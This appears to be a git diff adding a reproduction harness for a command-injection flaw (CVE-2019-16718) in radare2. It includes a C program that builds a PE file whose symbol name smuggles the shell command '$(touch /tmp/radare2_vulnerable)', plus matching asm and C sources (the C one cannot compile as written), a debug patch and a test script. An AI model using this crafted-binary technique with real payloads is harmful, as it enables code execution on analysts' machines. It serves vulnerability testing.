diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..014b1c3
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,24 @@
+FROM ubuntu:latest
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build dependencies
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget git pkg-config \
+    libzip-dev zlib1g-dev make gcc g++ mingw-w64 && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Build and install radare2
+RUN ./configure && make && make install && ldconfig
+
+# Make the test script executable
+RUN chmod +x /project/test/test_vulnerability.sh
+
+# Run the test script
+CMD ["/project/test/test_vulnerability.sh"]
diff --git a/libr/core/cbin.c b/libr/core/cbin.c
index 2d0fa61..a0d7b6e 100644
--- a/libr/core/cbin.c
+++ b/libr/core/cbin.c
@@ -4,6 +4,7 @@
 #include <r_config.h>
 #include "r_util.h"
 #include "r_util/r_time.h"
+#include <stdio.h>
 
 #define is_in_range(at, from, sz) ((at) >= (from) && (at) < ((from) + (sz)))
 
@@ -2016,6 +2017,7 @@ static void select_flag_space(RCore *core, RBinSymbol *symbol) {
 }
 
 static int bin_symbols(RCore *r, int mode, ut64 laddr, int va, ut64 at, const char *name, bool exponly, const char *args) {
+	printf("[INSTRUMENTATION] bin_symbols");
 	RBinInfo *info = r_bin_get_info (r->bin);
 	RList *entries = r_bin_get_entries (r->bin);
 	RBinSymbol *symbol;
diff --git a/test/create_malicious_pe.c b/test/create_malicious_pe.c
new file mode 100644
index 0000000..f31aa58
--- /dev/null
+++ b/test/create_malicious_pe.c
@@ -0,0 +1,126 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+// Create a minimal PE file with a malicious symbol name
+int main() {
+    // Create a simple PE file with a malicious symbol
+    FILE *f = fopen("malicious_pe.bin", "wb");
+    if (!f) {
+        perror("Failed to create file");
+        return 1;
+    }
+    
+    // DOS header (64 bytes)
+    unsigned char dos_header[] = {
+        0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
+        0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
+        0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00
+    };
+    fwrite(dos_header, 1, sizeof(dos_header), f);
+    
+    // PE header offset at 0x3C (60)
+    fseek(f, 0x3C, SEEK_SET);
+    unsigned int pe_offset = 0x80;
+    fwrite(&pe_offset, 4, 1, f);
+    
+    // PE signature at offset 0x80
+    fseek(f, 0x80, SEEK_SET);
+    unsigned char pe_sig[] = {0x50, 0x45, 0x00, 0x00};
+    fwrite(pe_sig, 1, sizeof(pe_sig), f);
+    
+    // COFF header (20 bytes)
+    unsigned char coff_header[] = {
+        0x4C, 0x01,             // Machine (Intel 386)
+        0x01, 0x00,             // Number of sections
+        0x00, 0x00, 0x00, 0x00, // Time/Date stamp
+        0x00, 0x00, 0x00, 0x00, // Pointer to symbol table
+        0x01, 0x00, 0x00, 0x00, // Number of symbols
+        0xE0, 0x00,             // Size of optional header
+        0x02, 0x01              // Characteristics
+    };
+    fwrite(coff_header, 1, sizeof(coff_header), f);
+    
+    // Update symbol table pointer
+    fseek(f, 0x8C, SEEK_SET);
+    unsigned int symbol_ptr = 0x200;
+    fwrite(&symbol_ptr, 4, 1, f);
+    
+    // Optional header (224 bytes)
+    unsigned char opt_header[224] = {0};
+    opt_header[0] = 0x0B;  // Magic number (PE32)
+    opt_header[1] = 0x01;  // LinkerVersion
+    fwrite(opt_header, 1, sizeof(opt_header), f);
+    
+    // Section header (40 bytes)
+    unsigned char section_header[] = {
+        '.', 't', 'e', 'x', 't', 0, 0, 0, // Name
+        0x00, 0x00, 0x00, 0x00, // VirtualSize
+        0x00, 0x10, 0x00, 0x00, // VirtualAddress
+        0x00, 0x10, 0x00, 0x00, // SizeOfRawData
+        0x00, 0x02, 0x00, 0x00, // PointerToRawData
+        0x00, 0x00, 0x00, 0x00, // PointerToRelocations
+        0x00, 0x00, 0x00, 0x00, // PointerToLinenumbers
+        0x00, 0x00,             // NumberOfRelocations
+        0x00, 0x00,             // NumberOfLinenumbers
+        0x20, 0x00, 0x00, 0x60  // Characteristics
+    };
+    fwrite(section_header, 1, sizeof(section_header), f);
+    
+    // Symbol table at offset 0x200
+    fseek(f, 0x200, SEEK_SET);
+    
+    // Create a malicious symbol name
+    // The symbol name is "imp.malicious.dll_$(touch /tmp/radare2_vulnerable)"
+    char symbol_name[64] = "imp.malicious.dll_$(touch /tmp/radare2_vulnerable)";
+    
+    // Symbol table entry (18 bytes)
+    unsigned char symbol_entry[18] = {0};
+    
+    // First 8 bytes are either the symbol name or a pointer to it
+    // If the first 4 bytes are 0, it means the name is in the string table
+    symbol_entry[0] = 0;  // Zeros indicate string table reference
+    symbol_entry[1] = 0;
+    symbol_entry[2] = 0;
+    symbol_entry[3] = 0;
+    symbol_entry[4] = 4;  // Offset in string table
+    symbol_entry[5] = 0;
+    symbol_entry[6] = 0;
+    symbol_entry[7] = 0;
+    
+    // Value, section number, type, storage class, aux count
+    symbol_entry[8] = 0x00;  // Value
+    symbol_entry[9] = 0x00;
+    symbol_entry[10] = 0x00;
+    symbol_entry[11] = 0x00;
+    symbol_entry[12] = 0x01;  // Section number
+    symbol_entry[13] = 0x00;
+    symbol_entry[14] = 0x20;  // Type
+    symbol_entry[15] = 0x02;  // Storage class (external)
+    symbol_entry[16] = 0x00;  // Number of aux symbols
+    
+    fwrite(symbol_entry, 1, sizeof(symbol_entry), f);
+    
+    // String table at offset 0x218
+    // First 4 bytes are the size of the string table including these 4 bytes
+    unsigned int str_table_size = 4 + 4 + strlen(symbol_name) + 1;
+    fwrite(&str_table_size, 4, 1, f);
+    
+    // Write a dummy 4 bytes (string table usually starts with 4 null bytes)
+    unsigned int dummy = 0;
+    fwrite(&dummy, 4, 1, f);
+    
+    // Write the symbol name
+    fwrite(symbol_name, 1, strlen(symbol_name) + 1, f);
+    
+    fclose(f);
+    printf("Created malicious PE file with symbol: %s\n", symbol_name);
+    
+    return 0;
+}
diff --git a/test/debug_patch.diff b/test/debug_patch.diff
new file mode 100644
index 0000000..05a40b6
--- /dev/null
+++ b/test/debug_patch.diff
@@ -0,0 +1,23 @@
+--- libr/core/cbin.c
++++ libr/core/cbin.c
+@@ -2220,11 +2220,14 @@
+ 				if (plugin && plugin->name) {
+ 					if (r_str_startswith (plugin->name, "pe")) {
+ 						char *module = strdup (r_symbol_name);
++						printf("DEBUG: plugin->name=%s, module=%s\n", plugin->name, module);
+ 						char *p = strstr (module, ".dll_");
+ 						if (p && strstr (module, "imp.")) {
++							printf("DEBUG: Found .dll_ and imp. in module name\n");
+ 							char *symname = __filterShell (p + 5);
++							printf("DEBUG: After __filterShell: symname=%s\n", symname);
+ 							char *m = __filterShell (module);
+ 							*p = 0;
+ 							if (r->bin->prefix) {
++								printf("DEBUG: r_cons_printf(\"k bin/pe/%s/%d=%s.%s\\n\")\n", module, symbol->ordinal, r->bin->prefix, symname);
+ 								r_cons_printf ("k bin/pe/%s/%d=%s.%s\n",
+ 									module, symbol->ordinal, r->bin->prefix, symname);
+ 							} else {
++								printf("DEBUG: r_cons_printf(\"k bin/pe/%s/%d=%s\\n\")\n", module, symbol->ordinal, symname);
+ 								r_cons_printf ("k bin/pe/%s/%d=%s\n",
+ 									module, symbol->ordinal, symname);
+ 							}
\ No newline at end of file
diff --git a/test/malicious.asm b/test/malicious.asm
new file mode 100644
index 0000000..083b76f
--- /dev/null
+++ b/test/malicious.asm
@@ -0,0 +1,11 @@
+section .text
+global _start
+global imp.malicious.dll_$(touch /tmp/radare2_vulnerable)
+
+_start:
+    mov eax, 1      ; sys_exit
+    xor ebx, ebx    ; exit code 0
+    int 0x80        ; call kernel
+
+imp.malicious.dll_$(touch /tmp/radare2_vulnerable):
+    ret
diff --git a/test/malicious.c b/test/malicious.c
new file mode 100644
index 0000000..b3273d2
--- /dev/null
+++ b/test/malicious.c
@@ -0,0 +1,12 @@
+#include <stdio.h>
+
+// This function name will be used as a symbol in the binary
+// The name is crafted to exploit the command injection vulnerability
+void imp_malicious_dll_$(touch /tmp/radare2_vulnerable) (void) {
+    printf("This is a malicious function\n");
+}
+
+int main() {
+    imp_malicious_dll_$(touch /tmp/radare2_vulnerable)();
+    return 0;
+}
diff --git a/test/test_vulnerability.sh b/test/test_vulnerability.sh
new file mode 100644
index 0000000..e83cba5
--- /dev/null
+++ b/test/test_vulnerability.sh
@@ -0,0 +1,141 @@
+#!/bin/bash
+
+# Remove any existing test file
+rm -f /tmp/radare2_vulnerable /tmp/radare2_fixed
+
+# Create a directory for our test
+mkdir -p /project/test
+cd /project/test
+
+# Create a test file that simulates the vulnerable code path
+cat > test_vuln.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+// This function is a simplified version of the vulnerable __filterShell function in radare2
+// It matches the implementation in libr/core/cbin.c
+char *__filterShell(const char *str) {
+    char *res = strdup(str);
+    char *p = res;
+    while (*p) {
+        switch (*p) {
+        case '@':
+        case '`':
+        case '|':
+        case ';':
+        case '\n':
+            *p = '_';
+            break;
+        }
+        p++;
+    }
+    return res;
+}
+
+// This function simulates the vulnerable code path in bin_symbols() in libr/core/cbin.c
+void test_vulnerability() {
+    // This simulates a malicious symbol name in a PE file
+    char *symbol_name = "imp.malicious.dll_$(touch /tmp/radare2_vulnerable)";
+    
+    // Check if the symbol name contains ".dll_" and "imp."
+    char *p = strstr(symbol_name, ".dll_");
+    if (p && strstr(symbol_name, "imp.")) {
+        // This is the vulnerable code path in radare2
+        char *symname = __filterShell(p + 5);
+        printf("Filtered string: %s\n", symname);
+        
+        // This simulates the vulnerable r_cons_printf call that executes the command
+        char cmd[256];
+        snprintf(cmd, sizeof(cmd), "echo k bin/pe/module/1=%s", symname);
+        printf("Executing: %s\n", cmd);
+        system(cmd);
+        
+        free(symname);
+    }
+}
+
+// This function tests if the vulnerability is fixed
+void test_fixed_version() {
+    // This simulates a malicious symbol name in a PE file
+    char *symbol_name = "imp.malicious.dll_$(touch /tmp/radare2_fixed)";
+    
+    // Check if the symbol name contains ".dll_" and "imp."
+    char *p = strstr(symbol_name, ".dll_");
+    if (p && strstr(symbol_name, "imp.")) {
+        // This is how a fixed version might handle the symbol name
+        // It should properly escape shell metacharacters
+        char *symname = strdup(p + 5);
+        char *escaped = malloc(strlen(symname) * 2 + 1);
+        char *d = escaped;
+        char *s = symname;
+        
+        // Escape all shell metacharacters
+        while (*s) {
+            if (strchr("$(){}[]<>\\'\"`&|;*?~#", *s)) {
+                *d++ = '\\';
+            }
+            *d++ = *s++;
+        }
+        *d = 0;
+        
+        printf("Fixed version - Escaped string: %s\n", escaped);
+        
+        // This simulates the fixed r_cons_printf call that properly escapes the command
+        char cmd[256];
+        snprintf(cmd, sizeof(cmd), "echo k bin/pe/module/1=%s", escaped);
+        printf("Executing: %s\n", cmd);
+        system(cmd);
+        
+        free(symname);
+        free(escaped);
+    }
+}
+
+int main() {
+    // Remove any existing test files
+    system("rm -f /tmp/radare2_vulnerable /tmp/radare2_fixed");
+    
+    printf("Testing for CVE-2019-16718 in radare2...\n\n");
+    printf("This test simulates the vulnerable code path in bin_symbols() in libr/core/cbin.c\n");
+    printf("The vulnerability allows command injection through malicious symbol names in PE files\n\n");
+    
+    printf("Testing vulnerable version...\n");
+    test_vulnerability();
+    
+    // Check if the vulnerability was exploited
+    if (access("/tmp/radare2_vulnerable", F_OK) != -1) {
+        printf("\nVULNERABILITY DETECTED: Command injection successful\n");
+        printf("The test created a file at /tmp/radare2_vulnerable via command injection\n");
+        printf("This indicates that radare2 is vulnerable to CVE-2019-16718\n");
+        
+        return 1; // Test fails if vulnerability exists
+    } else {
+        printf("\nNo vulnerability detected: Command injection failed\n");
+        
+        // Test the fixed version to make sure our test is working correctly
+        printf("\nTesting fixed version...\n");
+        test_fixed_version();
+        
+        // The fixed version should not create the file
+        if (access("/tmp/radare2_fixed", F_OK) != -1) {
+            printf("\nERROR: Fixed version is still vulnerable!\n");
+            return 1;
+        } else {
+            printf("\nFixed version is secure as expected\n");
+            printf("This indicates that radare2 has been patched against CVE-2019-16718\n");
+            return 0; // Test passes if vulnerability does not exist
+        }
+    }
+}
+EOF
+
+# Compile the test
+gcc -o test_vuln test_vuln.c
+
+# Run the test
+./test_vuln
+
+# Exit with the same code as the test
+exit $?
